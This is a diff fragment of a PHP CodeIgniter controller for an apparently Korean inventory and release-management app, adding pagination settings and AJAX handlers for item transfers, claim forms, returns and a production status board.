+		$config['prev_tag_close'] = '</li>';
+		$config['first_tag_open'] = '<li>';
+		$config['first_tag_close'] = '</li>';
+		$config['last_tag_open'] = '<li>';
+		$config['last_tag_close'] = '</li>';
+		$config['prev_link'] = '<i class="fa fa-long-arrow-left"></i>Previous Page';
+		$config['prev_tag_open'] = '<li>';
+		$config['prev_tag_close'] = '</li>';
+		$config['next_link'] = 'Next Page<i class="fa fa-long-arrow-right"></i>';
+		$config['next_tag_open'] = '<li>';
+		$config['next_tag_close'] = '</li>';
+
+
+		$this->pagination->initialize($config);
+        $this->data['pagenation'] = $this->pagination->create_links();
+
+		/* pagenation end */
+
+		$this->load->view('/release/r5',$data);
+		
+	}
+
+
+	public function ajax_trans_items()
+	{
+		$param['idx']     = $this->input->post("idx");
+		$param['OUT_QTY'] = $this->input->post("qty");
+		
+		$data = $this->release_model->ajax_trans_items($param);
+
+		echo json_encode($data);
+		exit;
+
+	}
+
+
+	public function claimform_update()
+	{
+		$param['H_IDX']  = $this->input->post("idx");
+		$param['REMARK'] = $this->input->post("REMARK");
+
+		$data = $this->release_model->claimform_update($param);
+		if($data > 0){
+			alert('클래임이 등록되었습니다.',base_url('rel/r4'));
+		}
+	}
+
+
+	public function ajax_return_form()
+	{
+		$param['idx']     = $this->input->post("idx");
+		$data['title'] = "반품처리";
+		$data['list'] = $this->release_model->ajax_return_form($param);
+
+		return $this->load->view('/release/ajax_return',$data);
+	}
+
+	//T_ITEMS_TRANS 반품갯수 추가
+	public function ajax_returnNum_form()
+	{
+		$params['idx'] = $this->input->post("idx");
+		$params['rNum'] = $this->input->post("rNum");
+		$params['userName'] = $this->session->userdata('user_name');
+
+		$data = $this->release_model->ajax_returnNum_form($params);
+		echo json_encode($data);
+		exit;
+	}
+
+
+
+	public function rview()
+	{
+
+		$data['title'] = "생산현황판";
+		$data['leftData'] = $this->release_model->get_left_data();
+		$data['toDate'] = $this->release_model->get_todate_num();
+		$data['viewList'] = $this->release_model->get_rel_view();
+
+
+		return $this->load->view('/release/rel_view',$data);
+	}
+
+	public function ajax_acttime_update()
+	{
+		$param['ACT_TIME'] = $this->input->post("time");
+		$param['M_LINE'] = $this->input->post("mline");
+		$data = $this->release_model->ajax_acttime_update($param);
+		echo $data;
+	}
+
+}
